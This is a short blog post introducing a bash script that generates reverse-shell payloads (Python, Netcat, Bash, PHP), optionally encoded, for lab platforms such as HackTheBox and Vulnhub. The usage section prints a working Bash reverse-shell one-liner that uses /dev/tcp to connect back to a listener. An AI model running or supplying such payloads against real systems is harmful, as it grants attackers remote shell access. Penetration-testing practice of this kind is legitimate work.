---
title: Tools - Reverse Shell Generator Bash Script.
tags: [reverse shell, netcat]
categories: [Tools, Bash]
comments: true
date: 2021-12-11 11:33:00
---

Hello,

After spending a lot of time doing [HackTheBox](https://app.hackthebox.eu/home), [Vulnhub](https://www.vulnhub.com/) and [OffSec PG](https://portal.offensive-security.com/), I found that it's so annoying to keep losing the reverse shell and I have to visit [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) or [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) Reverse Shell Cheatsheet over and over again, so I made this script [Reverse Shell Generator](https://github.com/bing0o/Reverse_Shell_Generator) to make it easy and fast for getting Reverse shell payloads (Python, Netcat, BASH, PHP) with encoding (urlencode, base64) and Starting local Netcat listener without being worried about which port to use.

### Usage:
```bash
./payload.sh -h
```

This will display the help and the options that you can use:

```
#OPTIONS:
        -t, --type           - Payload Type [python, netcat, bash, php].
        -i, --ip             - Local IP.
        -p, --port           - Local Port.
        -r, --run            - Run Netcat Listener.
        -e, --encode         - Encode The Payload [base64, url].
        -I, --interface      - Get The IP From Specific Interface (Default: tun0).
        -h, --help           - Prints The Help and Exit.
```

![help](../../assets/img/sample/tools-reverse-shell-generator/help.png)

- Basic Usage:

if you just run the tool without options it will gives you a `bash` reverse shell with the ip of `tun0` Network Interface and a random port number:

```bash
$ payload
bash -i >& /dev/tcp/192.168.49.111/33381 0>&1
```

- Getting Netcat Payload with base64 encoding, the IP form `eth0` Interface and starting local netcat listener:
![netcat](../../assets/img/sample/tools-reverse-shell-generator/netcat-base64.png)

- You can specify the `IP` and `PORT` manually:
![manual](../../assets/img/sample/tools-reverse-shell-generator/manual-ip-port.png)



The tool on github: [https://github.com/bing0o/Reverse_Shell_Generator](https://github.com/bing0o/Reverse_Shell_Generator)

 Happy Hacking!